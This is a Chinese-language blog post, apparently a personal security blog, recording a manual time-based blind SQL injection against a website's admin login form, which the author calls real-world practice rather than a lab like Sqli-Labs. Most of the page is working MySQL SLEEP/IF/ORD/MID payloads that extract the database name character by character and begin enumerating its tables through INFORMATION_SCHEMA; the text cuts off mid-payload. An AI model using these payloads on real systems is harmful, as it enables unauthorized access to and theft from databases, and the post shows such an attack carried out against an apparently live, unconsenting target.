<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>后台登录框Time-based Blind | EvilAnne&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="可以暂停音乐哦！ 





转眼间就已经是7月了，加紧进度完成目标。很少写实战笔记，但大多数都是搞不下来嘻嘻。
后台登录框时间盲注，先是通过SQLMAP跑出来注入点只不过往下跑有些内容跑不出来或者直接不跑了，工具还是很不靠谱的。所以这里也记录一下手工时间盲注，之前我写过Sqli-Labs里面也有基于时间盲注注入，只不过是本地搭建的环境和真实环境还是不一样的。 可能是成就感不同吧">
<meta property="og:type" content="article">
<meta property="og:title" content="后台登录框Time-based Blind">
<meta property="og:url" content="http://yoursite.com/2016/07/01/后台登录框Time-based-Blind/index.html">
<meta property="og:site_name" content="EvilAnne's Blog">
<meta property="og:description" content="可以暂停音乐哦！ 





转眼间就已经是7月了，加紧进度完成目标。很少写实战笔记，但大多数都是搞不下来嘻嘻。
后台登录框时间盲注，先是通过SQLMAP跑出来注入点只不过往下跑有些内容跑不出来或者直接不跑了，工具还是很不靠谱的。所以这里也记录一下手工时间盲注，之前我写过Sqli-Labs里面也有基于时间盲注注入，只不过是本地搭建的环境和真实环境还是不一样的。 可能是成就感不同吧">
<meta property="og:image" content="http://i.imgur.com/V1Ok1pK.jpg">
<meta property="og:image" content="http://i.imgur.com/DvcjCQ0.jpg">
<meta property="og:image" content="http://i.imgur.com/laaWfHW.jpg">
<meta property="og:image" content="http://i.imgur.com/jyg0AkT.jpg">
<meta property="og:image" content="http://i.imgur.com/fFSysLh.jpg">
<meta property="og:updated_time" content="2016-07-01T08:37:34.726Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="后台登录框Time-based Blind">
<meta name="twitter:description" content="可以暂停音乐哦！ 





转眼间就已经是7月了，加紧进度完成目标。很少写实战笔记，但大多数都是搞不下来嘻嘻。
后台登录框时间盲注，先是通过SQLMAP跑出来注入点只不过往下跑有些内容跑不出来或者直接不跑了，工具还是很不靠谱的。所以这里也记录一下手工时间盲注，之前我写过Sqli-Labs里面也有基于时间盲注注入，只不过是本地搭建的环境和真实环境还是不一样的。 可能是成就感不同吧">
<meta name="twitter:image" content="http://i.imgur.com/V1Ok1pK.jpg">
  
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
  

</head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">EvilAnne&#39;s Blog</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">个人博客</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
      </nav>
      <nav id="sub-nav">
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-后台登录框Time-based-Blind" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2016/07/01/后台登录框Time-based-Blind/" class="article-date">
  <time datetime="2016-07-01T08:22:28.000Z" itemprop="datePublished">2016-07-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/网络安全/">网络安全</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      后台登录框Time-based Blind
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <font color="red">可以暂停音乐哦！ </font>

<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="http://music.163.com/outchain/player?type=2&id=25694408&auto=0&height=66"></iframe>



<p>转眼间就已经是7月了，加紧进度完成目标。<br>很少写实战笔记，但大多数都是搞不下来嘻嘻。</p>
<p>后台登录框时间盲注，先是通过SQLMAP跑出来注入点只不过往下跑有些内容跑不出来或者直接不跑了，工具还是很不靠谱的。所以这里也记录一下手工时间盲注，之前我写过Sqli-Labs里面也有基于时间盲注注入，只不过是本地搭建的环境和真实环境还是不一样的。 可能是成就感不同吧</p>
<a id="more"></a>
<h4 id="判断是否时间延迟注入"><a href="#判断是否时间延迟注入" class="headerlink" title="判断是否时间延迟注入"></a>判断是否时间延迟注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos; and (select * from (select(sleep(7)))aaa) and &apos;aaa&apos;=&apos;aaa  </span><br><span class="line">//延迟注入7秒</span><br></pre></td></tr></table></figure>
<p><img src="http://i.imgur.com/V1Ok1pK.jpg" alt="http://i.imgur.com/V1Ok1pK.jpg"> </p>
<h5 id="sleep-函数"><a href="#sleep-函数" class="headerlink" title="sleep()函数"></a>sleep()函数</h5><blockquote>
<p>MySQL中执行select sleep(N)可以让此语句运行N秒钟。<br>    当我们在后台框提交此语句的时候，可以通过firebug或者fiddler来查看是否有执行这条语句，如果执行了说明存在注入已经运行了sleep()函数。刚开始使用Firebug只不过登录错误会302跳转，所以firebug看不了这个页面执行了多少秒，所以通过Fiddler可以查看。</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">qwe' AND (<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span>(<span class="keyword">SLEEP</span>(<span class="number">4</span>-(<span class="keyword">IF</span>(<span class="keyword">ORD</span>(<span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">DATABASE</span>() <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">111</span>,<span class="number">0</span>,<span class="number">4</span>)))))ccav) <span class="keyword">AND</span> <span class="string">'aaa'</span>=<span class="string">'aaa </span><br><span class="line"></span><br><span class="line">//判断第一个数据库名称的第一位ascii码是否大于111，大于则执行SLEEP停留四秒</span></span><br></pre></td></tr></table></figure>
<p><img src="http://i.imgur.com/DvcjCQ0.jpg" alt="http://i.imgur.com/DvcjCQ0.jpg"> </p>
<h5 id="IF-、ORD-、MID-、IFNULL-、CAST"><a href="#IF-、ORD-、MID-、IFNULL-、CAST" class="headerlink" title="IF()、ORD()、MID()、IFNULL()、CAST()"></a>IF()、ORD()、MID()、IFNULL()、CAST()</h5><blockquote>
<p>   IF(expr1,expr2,expr3) : 当 expr1 为真时,则返回 expr2, 否则返回 expr3<br>    相当于在SQLInject注入语句中判断是否有这个内容(大致是怎样，但却说不出来)</p>
<p>   ORD()：返回第一个字符的 ascii 码<br>    不管输入什么,返回的都是首个字母的 ascii 值</p>
<p>   MID()：函数用于得到一个字符串的一部分</p>
<p>   IFNULL()：如果 expr1 不是 NULL，IFNULL() 返回 expr1，否则它返回 expr2。</p>
<p>   CAST()：用于数据类型转换。</p>
</blockquote>
<h4 id="猜解数据库名称第一位ASCII"><a href="#猜解数据库名称第一位ASCII" class="headerlink" title="猜解数据库名称第一位ASCII"></a>猜解数据库名称第一位ASCII</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">qwe' AND (<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span>(<span class="keyword">SLEEP</span>(<span class="number">4</span>-(<span class="keyword">IF</span>(<span class="keyword">ORD</span>(<span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">DATABASE</span>() <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">1111</span>,<span class="number">0</span>,<span class="number">4</span>)))))ccav) <span class="keyword">AND</span> <span class="string">'aaa'</span>=<span class="string">'aaa  </span><br><span class="line"></span><br><span class="line">//判断数据库第一位是否大于1111,如果不大于这里则不会执行SLEEP这个函数。所以页面停留的秒数则是：</span></span><br></pre></td></tr></table></figure>
<p><img src="http://i.imgur.com/laaWfHW.jpg" alt="http://i.imgur.com/laaWfHW.jpg"> </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">qwe' AND (<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span>(<span class="keyword">SLEEP</span>(<span class="number">4</span>-(<span class="keyword">IF</span>(<span class="keyword">ORD</span>(<span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">DATABASE</span>() <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">120</span>,<span class="number">0</span>,<span class="number">4</span>)))))ccav) <span class="keyword">AND</span> <span class="string">'aaa'</span>=<span class="string">'aaa </span><br><span class="line"></span><br><span class="line">//判断数据库第一位的ASCII码是否大于120,如果是则不会执行SLEEP。</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">qwe' AND (<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span>(<span class="keyword">SLEEP</span>(<span class="number">4</span>-(<span class="keyword">IF</span>(<span class="keyword">ORD</span>(<span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">DATABASE</span>() <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">118</span>,<span class="number">0</span>,<span class="number">4</span>)))))ccav) <span class="keyword">AND</span> <span class="string">'aaa'</span>=<span class="string">'aaa </span><br><span class="line"> //小于执行5秒</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">qwe' AND (<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span>(<span class="keyword">SLEEP</span>(<span class="number">4</span>-(<span class="keyword">IF</span>(<span class="keyword">ORD</span>(<span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">DATABASE</span>() <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">118</span>,<span class="number">0</span>,<span class="number">4</span>)))))ccav) <span class="keyword">AND</span> <span class="string">'aaa'</span>=<span class="string">'aaa</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>   而不执行，所以我们120也是不执行sleep。  相当于例子： a   b   c       a执行sleep    b不执行sleep   c不执行sleep</p>
</blockquote>
<p>那么我们从此判断正确的数则是B</p>
<p>那么刚刚  120不执行sleep函数   118执行sleep  119不执行sleep，这样就比较好理解，</p>
<p>我们数据库第一位ASCII码是 119</p>
<h5 id="猜解数据库名称第二位ASCII码"><a href="#猜解数据库名称第二位ASCII码" class="headerlink" title="猜解数据库名称第二位ASCII码"></a>猜解数据库名称第二位ASCII码</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">qwe' AND (<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span>(<span class="keyword">SLEEP</span>(<span class="number">4</span>-(<span class="keyword">IF</span>(<span class="keyword">ORD</span>(<span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">DATABASE</span>() <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">2</span>,<span class="number">1</span>))&gt;<span class="number">118</span>,<span class="number">0</span>,<span class="number">4</span>)))))ccav) <span class="keyword">AND</span> <span class="string">'aaa'</span>=<span class="string">'aaa</span><br><span class="line"></span><br><span class="line">不执行</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">qwe' AND (<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span>(<span class="keyword">SLEEP</span>(<span class="number">4</span>-(<span class="keyword">IF</span>(<span class="keyword">ORD</span>(<span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">DATABASE</span>() <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">2</span>,<span class="number">1</span>))&gt;<span class="number">100</span>,<span class="number">0</span>,<span class="number">4</span>)))))ccav) <span class="keyword">AND</span> <span class="string">'aaa'</span>=<span class="string">'aaa</span><br><span class="line"></span><br><span class="line">执行</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">qwe' AND (<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span>(<span class="keyword">SLEEP</span>(<span class="number">4</span>-(<span class="keyword">IF</span>(<span class="keyword">ORD</span>(<span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">DATABASE</span>() <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">2</span>,<span class="number">1</span>))&gt;<span class="number">110</span>,<span class="number">0</span>,<span class="number">4</span>)))))ccav) <span class="keyword">AND</span> <span class="string">'aaa'</span>=<span class="string">'aaa</span><br><span class="line"></span><br><span class="line">不执行</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">qwe' AND (<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span>(<span class="keyword">SLEEP</span>(<span class="number">4</span>-(<span class="keyword">IF</span>(<span class="keyword">ORD</span>(<span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">DATABASE</span>() <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">2</span>,<span class="number">1</span>))&gt;<span class="number">105</span>,<span class="number">0</span>,<span class="number">4</span>)))))ccav) <span class="keyword">AND</span> <span class="string">'aaa'</span>=<span class="string">'aaa</span><br><span class="line"></span><br><span class="line">不执行</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">qwe' AND (<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span>(<span class="keyword">SLEEP</span>(<span class="number">4</span>-(<span class="keyword">IF</span>(<span class="keyword">ORD</span>(<span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">DATABASE</span>() <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">2</span>,<span class="number">1</span>))&gt;<span class="number">104</span>,<span class="number">0</span>,<span class="number">4</span>)))))ccav) <span class="keyword">AND</span> <span class="string">'aaa'</span>=<span class="string">'aaa</span><br><span class="line"></span><br><span class="line">不执行</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">qwe' AND (<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span>(<span class="keyword">SLEEP</span>(<span class="number">4</span>-(<span class="keyword">IF</span>(<span class="keyword">ORD</span>(<span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">DATABASE</span>() <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">2</span>,<span class="number">1</span>))&gt;<span class="number">101</span>,<span class="number">0</span>,<span class="number">4</span>)))))ccav) <span class="keyword">AND</span> <span class="string">'aaa'</span>=<span class="string">'aaa</span><br><span class="line"></span><br><span class="line">不执行</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">qwe' AND (<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span>(<span class="keyword">SLEEP</span>(<span class="number">4</span>-(<span class="keyword">IF</span>(<span class="keyword">ORD</span>(<span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">DATABASE</span>() <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">2</span>,<span class="number">1</span>))&gt;<span class="number">100</span>,<span class="number">0</span>,<span class="number">4</span>)))))ccav) <span class="keyword">AND</span> <span class="string">'aaa'</span>=<span class="string">'aaa</span><br><span class="line"></span><br><span class="line">执行。</span></span><br></pre></td></tr></table></figure>
<p>说明数据库第二位则的ASCII码则是101</p>
<h5 id="猜解数据库名称第三位"><a href="#猜解数据库名称第三位" class="headerlink" title="猜解数据库名称第三位"></a>猜解数据库名称第三位</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">qwe' AND (<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span>(<span class="keyword">SLEEP</span>(<span class="number">4</span>-(<span class="keyword">IF</span>(<span class="keyword">ORD</span>(<span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">DATABASE</span>() <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">3</span>,<span class="number">1</span>))&gt;<span class="number">100</span>,<span class="number">0</span>,<span class="number">4</span>)))))ccav) <span class="keyword">AND</span> <span class="string">'aaa'</span>=<span class="string">'aaa</span><br><span class="line"></span><br><span class="line">不执行</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">qwe' AND (<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span>(<span class="keyword">SLEEP</span>(<span class="number">4</span>-(<span class="keyword">IF</span>(<span class="keyword">ORD</span>(<span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">DATABASE</span>() <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">3</span>,<span class="number">1</span>))&gt;<span class="number">90</span>,<span class="number">0</span>,<span class="number">4</span>)))))ccav) <span class="keyword">AND</span> <span class="string">'aaa'</span>=<span class="string">'aaa</span><br><span class="line"></span><br><span class="line">执行。</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">qwe' AND (<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span>(<span class="keyword">SLEEP</span>(<span class="number">4</span>-(<span class="keyword">IF</span>(<span class="keyword">ORD</span>(<span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">DATABASE</span>() <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">3</span>,<span class="number">1</span>))&gt;<span class="number">95</span>,<span class="number">0</span>,<span class="number">4</span>)))))ccav) <span class="keyword">AND</span> <span class="string">'aaa'</span>=<span class="string">'aaa</span><br><span class="line"></span><br><span class="line">执行。</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">qwe' AND (<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span>(<span class="keyword">SLEEP</span>(<span class="number">4</span>-(<span class="keyword">IF</span>(<span class="keyword">ORD</span>(<span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">DATABASE</span>() <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">3</span>,<span class="number">1</span>))&gt;<span class="number">96</span>,<span class="number">0</span>,<span class="number">4</span>)))))ccav) <span class="keyword">AND</span> <span class="string">'aaa'</span>=<span class="string">'aaa</span><br><span class="line"></span><br><span class="line">执行。</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">qwe' AND (<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span>(<span class="keyword">SLEEP</span>(<span class="number">4</span>-(<span class="keyword">IF</span>(<span class="keyword">ORD</span>(<span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">DATABASE</span>() <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">3</span>,<span class="number">1</span>))&gt;<span class="number">97</span>,<span class="number">0</span>,<span class="number">4</span>)))))ccav) <span class="keyword">AND</span> <span class="string">'aaa'</span>=<span class="string">'aaa</span><br><span class="line"></span><br><span class="line">执行。</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">qwe' AND (<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span>(<span class="keyword">SLEEP</span>(<span class="number">4</span>-(<span class="keyword">IF</span>(<span class="keyword">ORD</span>(<span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">DATABASE</span>() <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">3</span>,<span class="number">1</span>))&gt;<span class="number">98</span>,<span class="number">0</span>,<span class="number">4</span>)))))ccav) <span class="keyword">AND</span> <span class="string">'aaa'</span>=<span class="string">'aaa</span><br><span class="line"></span><br><span class="line">不执行</span></span><br></pre></td></tr></table></figure>
<p>所以第三位的ASCII码则是98</p>
<h5 id="猜解数据库名称第四位"><a href="#猜解数据库名称第四位" class="headerlink" title="猜解数据库名称第四位"></a>猜解数据库名称第四位</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">qwe' AND (<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span>(<span class="keyword">SLEEP</span>(<span class="number">4</span>-(<span class="keyword">IF</span>(<span class="keyword">ORD</span>(<span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">DATABASE</span>() <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">4</span>,<span class="number">1</span>))&gt;<span class="number">1111</span>,<span class="number">0</span>,<span class="number">4</span>)))))ccav) <span class="keyword">AND</span> <span class="string">'aaa'</span>=<span class="string">'aaa</span><br><span class="line"></span><br><span class="line">不执行</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">qwe' AND (<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span>(<span class="keyword">SLEEP</span>(<span class="number">4</span>-(<span class="keyword">IF</span>(<span class="keyword">ORD</span>(<span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">DATABASE</span>() <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">4</span>,<span class="number">1</span>))&gt;<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>)))))ccav) <span class="keyword">AND</span> <span class="string">'aaa'</span>=<span class="string">'aaa</span><br><span class="line"></span><br><span class="line">不执行</span></span><br></pre></td></tr></table></figure>
<p>最大值和最小值都没有，说明数据库名称不存在第四位，</p>
<p>这里将我们猜解的三位ASCII如下：119   101  98</p>
<p>转换后则是web</p>
<p><img src="http://i.imgur.com/jyg0AkT.jpg" alt="http://i.imgur.com/jyg0AkT.jpg"> </p>
<p>说明当前数据库的名称则是：web</p>
<h4 id="猜解数据库中多少表"><a href="#猜解数据库中多少表" class="headerlink" title="猜解数据库中多少表"></a>猜解数据库中多少表</h4><p>将web转换十六进制 ：0x776562</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">qwe' AND (<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span>(<span class="keyword">SLEEP</span>(<span class="number">4</span>-(<span class="keyword">IF</span>(<span class="keyword">ORD</span>(<span class="keyword">MID</span>((<span class="keyword">SELECT</span> <span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">COUNT</span>(table_name) <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>) <span class="keyword">FROM</span> INFORMATION_SCHEMA.TABLES <span class="keyword">WHERE</span> table_schema=<span class="number">0x776562</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">50</span>,<span class="number">0</span>,<span class="number">5</span>)))))ccav) <span class="keyword">AND</span> <span class="string">'aaa'</span>=<span class="string">'aaa</span><br><span class="line"></span><br><span class="line">执行</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">qwe' AND (<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span>(<span class="keyword">SLEEP</span>(<span class="number">4</span>-(<span class="keyword">IF</span>(<span class="keyword">ORD</span>(<span class="keyword">MID</span>((<span class="keyword">SELECT</span> <span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">COUNT</span>(table_name) <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>) <span class="keyword">FROM</span> INFORMATION_SCHEMA.TABLES <span class="keyword">WHERE</span> table_schema=<span class="number">0x776562</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">51</span>,<span class="number">0</span>,<span class="number">5</span>)))))ccav) <span class="keyword">AND</span> <span class="string">'aaa'</span>=<span class="string">'aaa</span><br><span class="line"></span><br><span class="line">执行</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">qwe' AND (<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span>(<span class="keyword">SLEEP</span>(<span class="number">4</span>-(<span class="keyword">IF</span>(<span class="keyword">ORD</span>(<span class="keyword">MID</span>((<span class="keyword">SELECT</span> <span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">COUNT</span>(table_name) <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>) <span class="keyword">FROM</span> INFORMATION_SCHEMA.TABLES <span class="keyword">WHERE</span> table_schema=<span class="number">0x776562</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">52</span>,<span 